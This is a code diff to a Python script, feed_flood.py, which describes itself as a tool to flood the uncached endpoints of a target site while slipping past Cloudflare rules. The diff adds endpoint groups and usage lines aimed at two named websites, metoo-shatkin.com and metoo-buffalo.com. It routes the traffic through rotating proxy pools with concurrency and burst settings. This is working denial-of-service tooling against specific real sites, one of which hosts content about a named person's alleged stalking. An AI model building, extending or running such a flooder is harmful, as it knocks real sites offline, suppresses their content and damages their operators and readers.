@@ -2,15 +2,11 @@
 """
 feed_flood.py — flood all open DYNAMIC endpoints on a target (no CF rule blocking them)
 
-Open DYNAMIC endpoints on metoo-shatkin.com (confirmed):
-  /feed/  /comments/feed/  /sitemap_index.xml  /page-sitemap.xml
-  /category-sitemap.xml  /  /dentist-todd-shatkins-history-of-stalking/
-
 Usage:
-  python3 feed_flood.py --proxy-file proxies_cf_passing_new.txt
   python3 feed_flood.py --webshare
-  python3 feed_flood.py --target metoo-shatkin.com --concurrency 25 --bursts 0
-  python3 feed_flood.py --endpoints feed sitemap home
+  python3 feed_flood.py --webshare --target metoo-buffalo.com --endpoints buffalo
+  python3 feed_flood.py --webshare --target metoo-shatkin.com --endpoints shatkin
+  python3 feed_flood.py --proxy-file proxies_cf_passing_new.txt --concurrency 25 --bursts 0
 """
 
 import time, random, argparse, threading, os
@@ -36,6 +32,13 @@ ENDPOINT_SETS = {
     "feed":    ["/feed/", "/comments/feed/"],
     "sitemap": ["/sitemap_index.xml", "/sitemap.xml", "/page-sitemap.xml", "/category-sitemap.xml"],
     "home":    ["/", "/dentist-todd-shatkins-history-of-stalking/"],
+    "shatkin": ["/feed/", "/comments/feed/", "/sitemap_index.xml", "/sitemap.xml",
+                "/page-sitemap.xml", "/category-sitemap.xml", "/",
+                "/dentist-todd-shatkins-history-of-stalking/"],
+    "buffalo": ["/", "/feed/", "/comments/feed/", "/sitemap_index.xml", "/sitemap.xml",
+                "/page-sitemap.xml", "/category-sitemap.xml", "/post-sitemap.xml",
+                "/wp-sitemap.xml", "/author/admin/", "/author/admin/feed/",
+                "/?p=1", "/about/", "/contact/", "/wp-content/"],
 }
 
 _lock       = threading.Lock()
@@ -140,7 +143,7 @@ def main():
     ap.add_argument("--endpoints",   nargs="+",
                     choices=list(ENDPOINT_SETS.keys()) + ["all"],
                     default=["all"],
-                    help="endpoint groups to hit: feed sitemap home all")
+                    help="endpoint groups: feed sitemap home shatkin buffalo all")
     args = ap.parse_args()
 
     global _endpoints
